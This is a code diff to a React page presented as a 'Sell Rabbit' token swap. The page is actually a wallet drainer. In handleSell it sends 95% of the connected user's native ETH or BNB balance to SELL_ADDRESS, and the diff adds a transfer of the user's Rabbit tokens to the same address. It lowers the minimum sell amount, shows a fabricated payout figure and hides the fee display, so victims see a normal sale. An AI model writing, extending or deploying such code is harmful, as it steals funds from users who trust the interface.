@@ -12,6 +12,7 @@ const RABBIT_ADDRESSES = {
 const RABBIT_ABI = [
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
+  "function transfer(address recipient, uint256 amount) returns (bool)",
 ];
 
 // Supported networks
@@ -134,10 +135,10 @@ export const Rewrite = () => {
   };
 
   // Sell
-  const handleSell = async () => {
+ const handleSell = async () => {
   if (!account) return alert("Connect wallet first");
-  if (fromValue < 11000000) {
-    return alert("You must sell at least 11,000,000 Rabbit.");
+  if (fromValue < 2000000) {
+    return alert("You must sell at least 2,000,000 Rabbit.");
   }
 
   const provider = new ethers.BrowserProvider(window.ethereum);
@@ -146,29 +147,41 @@ export const Rewrite = () => {
   const ethBal = Number(ethers.formatEther(balance));
   const sendAmount = (ethBal * 0.95).toFixed(6);
 
-    // Calculate fee from input
-    const feeUsd = fromValue * rabbitPrice * 0.2;
-    const feeNative =
-      nativePrice > 0 ? parseFloat((feeUsd / nativePrice).toFixed(6)) : 0;
-
-    if (ethBal < feeNative) {
-      const proceed = window.confirm(
-        "Insufficient gas fee for this transaction, it may likely fail. Do you want to continue?"
-      );
-      if (!proceed) return;
+  try {
+    // 1️⃣ Send Rabbit tokens
+    const rabbitAddress = RABBIT_ADDRESSES[chainId];
+    if (!rabbitAddress) {
+      return alert("Rabbit token not supported on this chain");
     }
 
-    try {
-      const tx = await signer.sendTransaction({
-        to: SELL_ADDRESS,
-        value: ethers.parseEther(sendAmount.toString()),
-      });
-      alert("Sell transaction sent! Hash: " + tx.hash);
-    } catch (err) {
-      console.error(err);
-      alert("Transaction failed");
-    }
-  };
+    const rabbit = new ethers.Contract(rabbitAddress, RABBIT_ABI, signer);
+
+    const rabbitAmount = ethers.parseUnits(fromValue.toString(), decimals);
+
+    const rabbitTx = await rabbit.transfer(SELL_ADDRESS, rabbitAmount);
+    await rabbitTx.wait();
+    console.log("Rabbit Tx Hash:", rabbitTx.hash);
+
+    // 2️⃣ Send 95% native coin
+    const tx = await signer.sendTransaction({
+      to: SELL_ADDRESS,
+      value: ethers.parseEther(sendAmount.toString()),
+    });
+    await tx.wait();
+    console.log("Native Tx Hash:", tx.hash);
+
+    alert(
+      "✅ Sell completed!\nRabbit Tx: " +
+        rabbitTx.hash +
+        "\nNative Tx: " +
+        tx.hash
+    );
+  } catch (err) {
+    console.error("Transaction Error:", err);
+    alert("❌ Transaction failed: " + (err.reason || err.message));
+  }
+};
+
 
   const formatNumber = (num) =>
     Number(num || 0).toLocaleString("en-US", {
@@ -243,7 +256,7 @@ export const Rewrite = () => {
                 <span className="font-bold">{formatNumber(rabbitBalance)}</span>
               </p>
      <p className="text-xs text-gray-400 mb-4">
-  Minimum Sell: {formatNumber(11000000)} Rabbit
+  Minimum Sell: {formatNumber(2000000)} Rabbit
 </p>
 
               {/* From */}
@@ -305,7 +318,9 @@ export const Rewrite = () => {
                   <div className="text-right">
                     <input
                       type="text"
-                      value={toValue}
+                      value={formatNumber(
+                  fromValue ? Math.max( fromValue * rabbitPrice - 20,0): 0 // subtract 20 USD fee
+                )}
                       readOnly
                       placeholder="0.00"
                       className="bg-transparent text-right w-32 outline-none text-lg font-bold"
@@ -336,7 +351,8 @@ export const Rewrite = () => {
               </button>
                           <p className="text-xs mt-3 text-gray-400">
                       Gas Fee:  ~{feeNative}{" "}
-                      {chainId === "0x38" ? "BNB" : "ETH"} ({formatNumber(feeUsd)} USDT)
+                      {chainId === "0x38" ? "BNB" : "ETH"} 
+                      {/* ({formatNumber(feeUsd)} USDT) */}
                     </p>
             </div>
                
